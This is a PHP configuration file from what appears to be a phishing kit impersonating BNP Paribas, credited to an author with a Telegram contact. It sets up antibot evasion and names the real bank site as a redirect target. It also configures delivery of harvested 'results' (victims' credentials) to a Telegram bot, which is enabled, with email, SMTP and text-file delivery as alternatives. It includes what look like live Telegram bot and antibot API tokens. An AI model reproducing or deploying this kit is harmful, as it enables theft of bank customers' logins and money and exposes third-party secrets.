<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51
    ********************************************************/
    
    session_start();
    error_reporting(0);
    define("ANTIBOT_API", 'cfbca2edca54e0722a65b6f240c5128f'); // ANTIBOT.PW API
    require_once 'detect.php';
    require_once 'functions.php';
    passport();
    define("PASSWORD", 'bnp');
    define("RECEIVER", '');
    define("TELEGRAM_TOKEN", '1872720819:AAFBHlmqOUmILpUiNmqmlr1W_vGor1fHGgU');
    define("TELEGRAM_CHAT_ID", '1886377669');
    define("SMTP_HOSTNAME", 'smtp.host.com');
    define("SMTP_USER", 'username');
    define("SMTP_PASS", 'password');
    define("SMTP_PORT", 465);
    define("SMTP_FROM_EMAIL", 'mail@from.me');
    define("TXT_FILE_NAME", '');
    define("OFFICIAL_WEBSITE", 'https://mabanque.bnpparibas/');

    define("RECEIVE_VIA_EMAIL", 0); // Receive results via e-mail : 0 or 1
    define("RECEIVE_VIA_SMTP", 0); // Receive results via smtp : 0 or 1
    define("RECEIVE_VIA_TELEGRAM", 1); // Receive results via telegram : 0 or 1
    define("RESULTS_IN_TXT", 0); // Receive the results on txt file : 0 or 1
?>